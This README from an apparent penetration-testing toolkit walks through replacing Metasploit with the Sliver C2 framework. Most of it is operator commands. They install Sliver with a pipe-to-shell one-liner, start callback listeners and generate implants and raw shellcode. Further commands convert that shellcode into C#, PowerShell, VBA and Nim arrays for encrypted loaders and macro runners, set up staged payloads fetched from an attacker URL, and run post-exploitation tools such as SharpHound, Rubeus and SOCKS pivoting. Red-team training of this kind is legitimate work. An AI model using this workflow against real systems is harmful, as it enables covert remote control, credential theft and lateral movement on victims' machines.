# Sliver C2 — OSEP Integration Guide

This directory replaces the Metasploit (`msfvenom` / `multi/handler` / `meterpreter`)
workflow with **Sliver** across the rest of `osep-tools`.

---

## 1. Install & start Sliver (v1.7.x)

```bash
# One-liner (Linux) — installs the single `sliver` binary to your PATH
curl https://sliver.sh/install | sudo bash

# Start it — `sliver` launches the client console and auto-starts the server
# on first run, so you can drive everything from this single prompt.
sliver
```

Implant generation happens inside the `sliver` console (`sliver >`).

---

## 2. Start a C2 listener

Pick the transport that fits the target egress. mTLS and HTTPS are the two most
commonly used for OSEP.

```text
# Mutual TLS
sliver > mtls   --lhost <LHOST> --lport 8888

# HTTPS / HTTP
sliver > https  --lhost <LHOST> --lport 443
sliver > http   --lhost <LHOST> --lport 80

# WireGuard (fast, needs wg tooling on the server)
sliver > wg     --lhost <LHOST> --lport 53

# DNS
sliver > dns    --domains <domain>
```

List listeners with `jobs`. Each listener needs a matching implant, so generate
**after** the listener is up.

---

## 3. Generate implants / shellcode

The `generate` output format maps directly onto the existing osep-tools loaders:

| `--format` | Output | Feed it into |
|---|---|---|
| `exe` | Standalone executable (PE / ELF / Mach-O, per `--os`) | Direct delivery, or re-pack with NimSyscallPacker |
| `shared` | Dynamic library / DLL | DLL sideload / reflective load |
| `service` | Windows service binary | Persistence |
| `shellcode` | Raw PIC shellcode (MBs — full Go implant) | `sliver2arrays.py` → C#/PowerShell/VBA/Nim arrays, AES/XOR encryptors, NimSyscallPacker |
| `archive` | Go c-archive | Custom C host |

### Examples

```text
# Raw PIC shellcode (→ sliver2arrays.py for C#/PowerShell/VBA/Nim arrays, or → NimSyscallPacker)
sliver > generate --mtls <LHOST>:8888 --format shellcode --save /tmp/sc.bin

# Convert raw shellcode into a C# / PowerShell / VBA / Nim byte array:
python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp
python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1
python3 sliver/sliver2arrays.py /tmp/sc.bin --vba
python3 sliver/sliver2arrays.py /tmp/sc.bin --nim

# Standalone EXE
sliver > generate --mtls <LHOST>:8888 --format exe --save /tmp/implant.exe

# Windows service binary / DLL
sliver > generate --mtls <LHOST>:8888 --format service --save /tmp/svc.exe
sliver > generate --mtls <LHOST>:8888 --format shared  --save /tmp/implant.dll
```

### Sizing note (important)

A full Sliver implant is **multi-MB** (Go runtime). The original osep-tools
runners hard-coded `VirtualAlloc(..., 0x1000, ...)` (4 KB) — those have been
fixed to allocate `shellcode.Length`. If you need a *small* payload (tight VBA
or shellcode runner), use a **stage listener** instead (next section) so the
injected blob is only a few hundred bytes.

---

## 4. Staged payloads (small shellcode)

A stage listener serves the implant over HTTP(S)/TCP (optionally compressed or
encrypted), so a small stage-1 stager can fetch and run the full implant at
runtime. Sliver serves and pre-generates the stage-2 binary; the tiny stage-1
stager itself comes from the Armory (`beignet` / `malasada`) or your own loader.

```text
# 1. Create a profile describing the implant
sliver > profiles new --mtls <LHOST>:8888 --format shellcode my-profile

# 2. Start a stage listener that serves the implant over HTTP(S)
sliver > stage-listener --url http://<LHOST>:8080 --profile my-profile

# 3. Pre-generate the stage-2 binary (optionally --compress / --aes-encrypt-key)
sliver > profiles stage --save /tmp/stage2.bin my-profile
```

Serve `/tmp/stage2.bin` yourself (e.g. `python3 -m http.server`) and point your
stage-1 stager at it.

---

## 5. Working with sessions / beacons

```text
sliver > sessions            # interactive sessions
sliver > beacons             # beacon implants
sliver > use <session-id>    # interact with a session
sliver > use -b <beacon-id>  # interact with a beacon
```

```text
# Implant a shellcode runner while a session is active
sliver (IMPLANT) > upload /tmp/runner.exe
sliver (IMPLANT) > execute -o runner.exe
```

---

## 6. Shellcode format conversion (`sliver2arrays.py`)

`sliver2arrays.py` is a helper that ships **in this repo** (`osep-tools/sliver/`)
— it is unrelated to the Sliver C2 binary. It converts raw shellcode
(`--format shellcode`) into C#/PowerShell/VBA/Nim array syntax.

```bash
# Run from the osep-tools repo root:
python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp
python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1
python3 sliver/sliver2arrays.py /tmp/sc.bin --vba
python3 sliver/sliver2arrays.py /tmp/sc.bin --nim
python3 sliver/sliver2arrays.py /tmp/sc.bin --all

# Optional — symlink into your PATH so it works from any directory:
#   ln -s "$(pwd)/sliver/sliver2arrays.py" ~/.local/bin/sliver2arrays
```

> Sliver has no `csharp` / `ps1` / `nim` / `vba` output formats — `generate --format`
> only accepts `exe`, `shared`, `service`, `archive`, or `shellcode`. To get a
> C#/PowerShell/VBA/Nim byte array, always generate `--format shellcode` and convert
> it with `sliver2arrays.py`.

Then paste the output into the matching encryptor/loader (e.g. feed the C#
output into `aes-shellcode-encryption.cs`, the VBA output into the
`word-macro` runners, etc.).

---

## 7. Post-exploitation helpers

```text
sliver (IMPLANT) > portfwd add --remote 127.0.0.1:3389 --bind 127.0.0.1:13389   # pivot
sliver (IMPLANT) > socks5 start                                                  # SOCKS proxy
sliver (IMPLANT) > execute-assembly /path/to/SharpHound.exe                       # run .NET tooling
sliver (IMPLANT) > armory install rubeus                                          # BOFs / tools
```

For lateral movement see `../lateral-movement/` (WinRM, WMI, persistence) and
`../nimsyscallpacker/` for syscall-based payload packing.
